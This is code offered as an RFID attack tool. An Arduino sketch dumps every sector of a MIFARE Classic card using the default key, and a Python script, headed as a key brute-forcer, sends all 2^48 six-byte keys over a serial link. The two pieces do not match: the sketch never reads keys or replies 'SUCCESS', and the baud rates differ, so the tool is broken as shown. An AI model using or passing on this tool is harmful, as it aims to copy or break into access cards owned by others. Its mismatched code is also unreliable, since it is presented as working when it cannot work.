#include <SPI.h>
#include <MFRC522.h>

#define RST_PIN 9
#define SS_PIN 10

MFRC522 mfrc522(SS_PIN, RST_PIN);

void setup() {
  Serial.begin(9600);
  SPI.begin();
  mfrc522.PCD_Init();
  Serial.println("RFID reader ready. Waiting for cards...");
}

void loop() {
  if (!mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial()) {
    return;
  }

  Serial.print("UID:");
  for (byte i = 0; i < mfrc522.uid.size; i++) {
    Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? " 0" : " ");
    Serial.print(mfrc522.uid.uidByte[i], HEX);
  }
  Serial.println();

  dumpCardData();
  mfrc522.PICC_HaltA();
  mfrc522.PCD_StopCrypto1();
}

void dumpCardData() {
  MFRC522::MIFARE_Key key;
  for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;

  byte buffer[18];
  byte size = sizeof(buffer);

  for (byte sector = 0; sector < 16; sector++) {
    Serial.print("Sector ");
    Serial.println(sector);
    for (byte block = 0; block < 4; block++) {
      byte blockNumber = sector * 4 + block;
      if (mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, blockNumber, &key, &(mfrc522.uid)) == MFRC522::STATUS_OK) {
        if (mfrc522.MIFARE_Read(blockNumber, buffer, &size) == MFRC522::STATUS_OK) {
          Serial.print("Block ");
          Serial.print(blockNumber);
          Serial.print(":");
          for (byte i = 0; i < 16; i++) {
            Serial.print(buffer[i] < 0x10 ? " 0" : " ");
            Serial.print(buffer[i], HEX);
          }
          Serial.println();
        } else {
          Serial.println("Error reading block");
        }
      } else {
        Serial.println("Authentication failed");
      }
    }
  }
}
```

## Python Code for Brute Forcing Keys

```python
import serial
import itertools

arduino_port = "COM3"
baud_rate = 115200

def generate_keys():
    for key in itertools.product(range(256), repeat=6):
        yield bytes(key)

def main():
    ser = serial.Serial(arduino_port, baud_rate, timeout=1)
    print(f"Connected to Arduino on {arduino_port}")

    try:
        for key in generate_keys():
            print(f"Sending key: {key.hex()}")
            ser.write(key)
            response = ser.readline().decode().strip()
            print(f"Response: {response}")
            if response == "SUCCESS":
                print(f"Key found: {key.hex()}")
                with open("found_keys.txt", "a") as f:
                    f.write(f"{key.hex()}\n")
                break
    except KeyboardInterrupt:
        print("Brute force stopped by user.")
    finally:
        ser.close()

if __name__ == "__main__":
    main()